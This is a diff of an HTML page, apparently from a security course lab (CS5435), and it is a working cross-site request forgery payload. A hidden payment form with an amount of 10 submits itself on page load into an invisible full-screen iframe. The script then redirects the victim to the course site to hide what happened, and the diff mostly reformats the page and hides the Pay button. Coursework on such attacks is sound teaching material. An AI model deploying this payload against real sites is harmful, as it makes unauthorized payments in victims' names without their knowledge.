@@ -14,23 +14,23 @@
     <div class="form-group">
       <div class="form-input"><input name="amount" type="hidden" value="10"/></div>
     </div>
-    <input class="form-button" type="hidden" value="Pay"/>
-  </form>
-  <iframe id="cs5435" name="cs5435" src="" style="visibility: hidden; position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe> 
+    <input class="form-button" type="hidden" value="Pay" style="display: none;"/>
+ </form>
 
-  <script> 
-    // method1:
-    // onload = document.pay_form.submit();// document.forms[0].submit()
-    // document.getElementById('cs5435').onload = function() {
-    // 	window.top.location.href = "http://cs5435.github.io"; 
-    // };
+ <iframe id="cs5435" name="cs5435" src="" style="visibility:hidden; position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe> 
+<script> 
+	// method1:
+	// onload = document.pay_form.submit();// document.forms[0].submit()
+	// document.getElementById('cs5435').onload = function() {
+	// 	window.top.location.href = "http://cs5435.github.io"; 
+	// };
 
-    // method2:
-      window.addEventListener("load", () => {
-        document.forms[0].submit();
-        document.getElementById("cs5435").addEventListener("load", () => {
-          window.location.replace("http://cs5435.github.io");
-        });
+	// method2:
+    window.addEventListener("load", () => {
+      document.forms[0].submit();
+      document.getElementById("cs5435").addEventListener("load", () => {
+        window.location.replace("http://cs5435.github.io");
       });
-  </script>
+    });
+</script>
 </html>
